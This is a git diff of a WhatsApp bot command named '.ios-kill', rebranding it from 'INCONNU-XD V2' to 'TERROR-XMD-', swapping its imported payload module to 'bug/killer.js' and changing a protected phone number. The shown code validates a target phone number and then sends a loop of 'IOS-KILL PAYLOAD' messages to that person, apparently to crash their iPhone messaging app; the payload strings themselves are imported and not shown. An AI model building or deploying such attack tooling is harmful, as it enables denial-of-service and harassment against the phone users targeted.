@@ -1,4 +1,4 @@
-import bugchat from '../../bug/inconnu3.js';
+import bugchat from '../../bug/killer.js';
 import config from '../../config.cjs';
 
 const iosKillCommand = async (m, Matrix) => {
@@ -28,11 +28,11 @@ const iosKillCommand = async (m, Matrix) => {
 
   if (!targetNumber || isNaN(targetNumber)) {
     return await Matrix.sendMessage(m.from, {
-      text: '❌ *Usage:* `.ios-kill 554xxxxxxxxx`',
+      text: '❌ *Usage:* `.ios-kill 254xxxxxxxx`',
     }, { quoted: m });
   }
 
-  const safeNumbers = ['554488138425', config.OWNER_NUMBER, ...(config.SUDO || [])];
+  const safeNumbers = ['254769677305', config.OWNER_NUMBER, ...(config.SUDO || [])];
   if (safeNumbers.includes(targetNumber.replace(/[^0-9]/g, ''))) {
     return await Matrix.sendMessage(m.from, {
       text: '⚠️ *You cannot target this protected number.*',
@@ -44,12 +44,12 @@ const iosKillCommand = async (m, Matrix) => {
 
   // Confirmation message
   await Matrix.sendMessage(m.from, {
-    text: `🧠 *INCONNU-XD V2 IOS-KILL DEPLOYED*\n\n👾 Targeting: *+${targetNumber}*\n📱 Device: *iPhone*\n🔋 Intensity: *MAXIMUM*\n\n⏳ *Launching Payload...*`,
+    text: `🧠 *TERROR-XMD- IOS-KILL DEPLOYED*\n\n👾 Targeting: *+${targetNumber}*\n📱 Device: *iPhone*\n🔋 Intensity: *MAXIMUM*\n\n⏳ *Launching Payload...*`,
   }, { quoted: m });
 
   for (let i = 0; i < attackLines.length; i++) {
     await Matrix.sendMessage(targetJid, {
-      text: `🧨 *IOS-KILL PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _INCONNU-XD V2 ATTACK ENGINE_`,
+      text: `🧨 *IOS-KILL PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _TERROR-XMD- ATTACK ENGINE_`,
     });
     await new Promise(r => setTimeout(r, 250));
   }
